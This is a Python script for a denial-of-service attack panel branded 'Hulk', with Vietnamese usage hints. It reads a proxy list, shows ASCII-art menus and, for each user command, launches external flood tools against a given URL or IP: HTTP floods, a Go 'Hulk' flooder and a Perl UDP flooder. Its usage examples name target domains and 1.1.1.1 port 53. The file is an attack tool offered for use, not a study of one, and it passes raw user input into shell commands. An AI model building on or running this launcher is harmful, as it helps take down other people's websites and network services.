import socket
import os
import requests
import random
import getpass
import time
import sys
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
clear()
uname=input("Enter Server Name:")
clear()
print(f"Welcome Back To Hulk | User : {uname}")
print("please wait..")
time.sleep(1)
proxys = open('proxies.txt').readlines()
bots = len(proxys)
def si():
  print("[2005] | DDoS Hulk Power by Tvinh | New Panel")
def help():
  print("""
  |Layer7|
  |Layer4|
""")
print(f'''
⠸⣷⣦⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⠀⠀⠀
⠀⠙⣿⡄⠈⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠊⠉⣿⡿⠁⠀⠀⠀
⠀⠀⠈⠣⡀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠁⠀⠀⣰⠟⠀⠀⠀⣀⣀
⠀⠀⠀⠀⠈⠢⣄⠀⡈⠒⠊⠉⠁⠀⠈⠉⠑⠚⠀⠀⣀⠔⢊⣠⠤⠒⠊⠉⠀⡜
⠀⠀⠀⠀⠀⠀⠀⡽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⡔⠊⠁⠀⠀⠀⠀⠀⠀⠇
⠀⠀⠀⠀⠀⠀⠀⡇⢠⡤⢄⠀⠀⠀⠀⠀⡠⢤⣄⠀⡇⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⢀⠇⠹⠿⠟⠀⠀⠤⠀⠀⠻⠿⠟⠀⣇⠀⠀⡀⠠⠄⠒⠊⠁⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡆⠀⠰⠤⠖⠦⠴⠀⢀⣶⣿⣿⠀⠙⢄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢻⣿⠃⠀⠀⠀⠀⠀⠀⠀⠈⠿⡿⠛⢄⠀⠀⠱⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⠈⠓⠦⠀⣀⣀⣀⠀⡠⠴⠊⠹⡞⣁⠤⠒⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⠃⠀⠀⠀⠀⡌⠉⠉⡤⠀⠀⠀⠀⢻⠿⠆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠰⠁⡀⠀⠀⠀⠀⢸⠀⢰⠃⠀⠀⠀⢠⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢶⣗⠧⡀⢳⠀⠀⠀⠀⢸⣀⣸⠀⠀⠀⢀⡜⠀⣸⢤⣶⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⣦⣈⣧⡀⠀⠀⢸⣿⣿⠀⠀⢀⣼⡀⣨⣿⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⠿⠿⠓⠄⠤⠘⠉⠙⠤⢀⠾⠿⣿⠟⠋
''')
time.sleep(1)
clear()
def layer7():
  clear()
  print("""\033[1;32m
           ║ HTTP-RAW     ║
           ║ HTTP-RAND    ║
           ║ HTTP-BROWSER ║
           ║ HTTP-SOCKET  ║
       ⢀⣠⣶⣿⣿⣷⣿⣿⣿⣿⠋⠀⣀⣀⣠⡤⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠖⠃⠀⠀⠀⠀⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠖⠂⠀⠀⠀⠀⠀⠀
⣼⣿⣿⣿⠛⠛⠛⠛⠛⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⡏⠀⠀⠀⠀⠀⢻⡇⢹⣿⣿⣿⣿⣿⢿⣿⣯⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⠯⢍⡀⠐⠒⢂⣸⠧⠜⣿⣿⣿⣿⡇⡀⢹⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⡿⣳⣾⡇⠀⠀⠰⠇⣭⣿⣿⣿⣿⡧⠄⣼⣦⠈⠑⠀⠀⠀⠀⠀⠀⠀⠀
⡏⣿⣿⡇⠀⠀⢀⠀⠀⠀⠀⠀⢸⢿⣿⣿⣧⣾⣿⣛⣧⣴⣾⡆⠀⠀⠀⠀⠀⠀
⠃⢸⣿⣧⠀⠀⢘⠀⡀⠀⠀⠀⢸⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
⠀⠈⣿⣿⣷⡀⠀⢁⣀⠀⠀⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀
⠀⠀⢻⠘⣿⠈⠢⡀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⡿⣿⣟⣿⣵⣄⠀⠀⠀⠀⠀
⠀⠀⠈⠃⢹⠀⣀⣼⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⣠⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
⠀⠀⠀⠘⢿⣿⣿⣿⣿⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀
⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄
⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
""")
def layer4():
  print("""\033[1;31m
                  ║ TCP ║
                  ║ UDP ║
  ⠀⠀⠀⠀                 ⢀⣠⣴⣿⣤⣤⣾⣿⠃⣀⣠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣶⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣟⠉⢻⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡟⣧⢪⣿⣿⣿⣿⣿⣿⠧⠀⠀⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣽⣇⠈⠀⠋⢹⣿⣿⣿⣿⠀⢀⣸⣿⣿⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣏⠁⠀⠀⠀⠀⣿⣿⣿⡟⢀⠠⠽⠛⠛⠛⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⣿⣤⠀⠀⡀⠀⢸⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣆⠀⠀⠀⠐⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡠⠄⢹⣿⡗⣄⣀⢠⠐⠃⠀⠀⠀⠀⠀⠀⢀⠀⠈⠀⠀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠀⠀⢻⡇⡄⢀⠀⢣⠀⠀⠀⠀⠀⢀⠄⠁⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡄⠀⠀⠀⠁⡇⡔⠴⢪⠀⠀⠀⠀⠔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠐⠲⠀⣰⠃⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡀⠀⢠⠂⠈⠇⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠈⠀⠜⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀
""")
def menu():
  clear()
  si()
  print("""
\033[1;32m ██░ ██  █    ██  ██▓     ██ ▄█▀   
\033[1;32m▓██░ ██▒ ██  ▓██▒▓██▒     ██▄█▒    
\033[1;32m▒██▀▀██░▓██  ▒██░▒██░    ▓███▄░    
\033[1;32m░▓█ ░██ ▓▓█  ░██░▒██░    ▓██ █▄    
\033[1;32m░▓█▒░██▓▒▒█████▓ ░██████▒▒██▒ █▄   
\033[1;32m ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ▒▒ ▓▒   
\033[1;32m ▒ ░▒░ ░░░▒░ ░ ░ ░ ░ ▒  ░░ ░▒ ▒░   
\033[1;32m ░  ░░ ░ ░░░ ░ ░   ░ ░   ░ ░░ ░    
\033[1;32m ░  ░  ░   ░         ░  ░░  ░    NgThanhVinh  
                                   
                                   
Type [Help] to see all commands
""")
def main():
  menu()
  while(True):
    cnc = input(f"""\x1b[38;2;239;239;239m┏━━[\x1b[38;2;255;99;71mTvinhHULK\x1b[38;2;239;239;239m] - [\x1b[38;2;255;234;0m{uname}\x1b[38;2;239;239;239m]\n\x1b[38;2;239;239;239m┗━━➤ """)
    if cnc == "layer7" or cnc == "Layer7" or cnc == "L7":
      layer7()
    elif cnc == "layer4" or cnc == "Layer4" or cnc == "l4":
      layer4()
    elif cnc == "help" or cnc == "Help":
      help()
    elif "http-raw" in cnc:
      try:
        url=cnc.split()[1]
        time=cnc.split()[2]
        os.system(f'node HTTP-RAW.js {url} {time}')
      except IndexError:
        print("http-raw <url <time>")
        print("Ví dụ: http-raw ngthanhvinh.vn 120")
    elif "http-rand" in cnc:
      try:
        url=cnc.split()[1]
        time=cnc.split()[2]
        os.system(f'node HTTP-RAND.js {url} {time}')
      except IndexError:
        print("http-rand <url> <time>")
        print("Ví Dụ: http-rand ngthanhvinh.vn 60")
    elif "http-socket" in cnc:
      try:
        url=cnc.split()[1]
        req=cnc.split()[2]
        time=cnc.split()[3]
        os.system(f'node HTTP-SOCKETS.js {url} {req} {time}')
      except IndexError:
        print("http-socket <url> <req_ip> <time>")
        print("Ví Dụ: http-socket ngthanhvinh.vn 150 60")
    elif "http-browser" in cnc:
      try:
        url=cnc.split()[1]
        req=cnc.split()[2]
        time=cnc.split()[3]
        os.system(f'node HTTP-BROWSER.js {url} {req} {time}')
      except IndexError:
        print("http-browser <url> <thread> <time>")
        print("Ví Dụ: HTTP-BROWSER ngthanhvinh.vn 120000 120")
    elif "hulk" in cnc:
      try:
        url=cnc.split()[1]
        methods=cnc.split()[2]
        os.system(f'go run Hulk.go -site {url} -data {methods}')
      except IndexError:
        print("hulk <URL> <GET/POST>")
        print("Ví Dụ: hulk ngthanhvinh.vn GET")
    elif "udp" in cnc:
      try:
        ip=cnc.split()[1]
        port=cnc.split()[2]
        time=cnc.split()[3]
        threads=cnc.split()[4]
        os.system(f'perl UDP-KILL.pl {ip} {port} {threads} {time}')
      except IndexError:
        print("udp <ip> <port> <thread> <time>")
        print("Ví Dụ: udp 1.1.1.1 53 12000 500")
    else:
      cmd=cnc.split()[0]
      print(f"Error: [{cmd}] Không Có Lệnh Này")
main()
